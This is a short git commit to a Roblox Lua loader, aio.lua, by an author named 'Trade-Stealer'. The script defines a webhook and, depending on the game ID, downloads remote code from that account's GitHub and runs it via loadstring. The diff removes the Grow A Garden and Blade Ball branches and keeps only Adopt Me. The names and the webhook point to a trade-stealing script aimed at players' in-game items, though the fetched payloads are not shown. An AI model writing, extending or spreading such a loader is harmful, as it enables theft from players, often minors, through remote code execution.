3f9f48e82a83273c6f3d7975e58730177a682167
Trade-Stealer <jonsnow12310@gmail.com>
2025-09-13 19:44:23 +0800

    Update aio.lua

--- aio.lua
+++ aio.lua
@@ -4,15 +4,9 @@ local Webhook = Webhook or ""
 local gameId = game.PlaceId
 local player = game:GetService("Players").LocalPlayer
 
-if gameId == 126884695634066 then
-    -- Grow A Garden
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Trade-Stealer/Universal/refs/heads/main/gag.lua"))()
-elseif gameId == 920587237 then
+if gameId == 920587237 then
     -- Adopt Me
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Trade-Stealer/Universal/refs/heads/main/Roblox"))()
-elseif gameId == 13772394625 then
-    -- Blade Ball
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Trade-Stealer/Universal/refs/heads/main/Blade_Ball"))()
 else
     -- Unsupported game
     player:Kick("Adopt Me! Only supported")
